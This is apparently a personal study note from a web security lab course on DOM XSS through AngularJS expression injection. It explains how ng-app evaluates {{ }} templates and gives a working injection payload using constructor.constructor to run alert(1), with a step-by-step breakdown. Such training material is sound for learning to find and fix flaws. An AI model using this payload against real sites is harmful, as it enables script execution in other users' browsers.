# DOM XSS — AngularJS Expression Injection

## What is AngularJS?

AngularJS is a JavaScript framework that processes HTML pages and adds dynamic behavior. When it finds the `ng-app` attribute on an element, it takes control of that region and processes **template expressions** inside `{{ }}`.

```html
<div ng-app>
    {{ 2 + 2 }}
</div>
```

**Result rendered in browser:** `4`

AngularJS evaluates anything inside `{{ }}` as a JavaScript expression.

---

## The Vulnerability

If user input is reflected inside an element that has `ng-app` (or any parent that does), AngularJS will evaluate it as an expression — **even without `<script>` tags, angle brackets, or event handlers**.

```html
<body ng-app>
    Search results for: {{ userInput }}
</body>
```

If `userInput` = `{{7*7}}` → renders `49`
If `userInput` = `{{constructor.constructor('alert(1)')()}}` → executes `alert(1)` 💥

---

## Why angle brackets don't matter here

Normal XSS requires injecting HTML tags like `<script>` or `<img>`. But if the application HTML-encodes `<` and `>`, those payloads fail.

AngularJS changes this completely:

```
Normal XSS: needs <tags>
AngularJS XSS: only needs {{ }} — no tags required
```

This is why the lab is titled *"with angle brackets and double quotes HTML-encoded"* — the protection doesn't help because AngularJS processes `{{ }}` before the browser sees the HTML.

---

## Lab: DOM XSS in AngularJS expression

**Level:** Practitioner ✅ Solved

**Setup:** The page uses `ng-app`. User input from the search box is reflected in the page inside the AngularJS-controlled region.

**Payload:**
```
{{constructor.constructor('alert(1)')()}}
```

**How it works:**
```javascript
constructor          // every object has a constructor property
.constructor         // Function.constructor = the Function constructor itself
('alert(1)')         // creates a new function with body: alert(1)
()                   // immediately calls it
```

This is equivalent to:
```javascript
new Function('alert(1)')()
```

Which executes `alert(1)`.

---

## Key Takeaways

- AngularJS `{{ }}` = JavaScript execution inside HTML
- No `<script>` or event handlers needed
- HTML encoding of `<>` does **not** protect against this
- Always check if the page loads AngularJS (`ng-app` in source)
- This class of vulnerability is called **Server-Side Template Injection** when it happens server-side — but here it's client-side template injection

---

## 🚧 Advanced AngularJS (To Be Completed)

The following labs require understanding AngularJS's sandbox and how to escape it:

- Reflected XSS with AngularJS sandbox escape without strings
- Reflected XSS with AngularJS sandbox escape and CSP

These require deeper knowledge of AngularJS internals and will be completed in a later stage.
